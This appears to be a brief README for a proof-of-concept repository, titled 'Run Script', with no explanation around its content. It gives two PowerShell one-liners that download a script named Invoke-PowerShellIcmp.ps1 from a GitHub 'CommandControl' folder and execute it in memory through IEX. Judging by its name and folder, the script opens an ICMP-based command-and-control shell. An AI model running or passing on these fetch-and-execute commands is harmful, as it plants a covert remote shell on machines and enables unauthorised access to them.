
# Run Script

IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/cyber-rangers/PoCs/main/CommandControl/Invoke-PowerShellIcmp.ps1");Invoke-PowerShellIcmp



. { iwr -useb https://raw.githubusercontent.com/cyber-rangers/PoCs/main/CommandControl/Invoke-PowerShellIcmp.ps1 } | iex; Invoke-PowerShellIcmp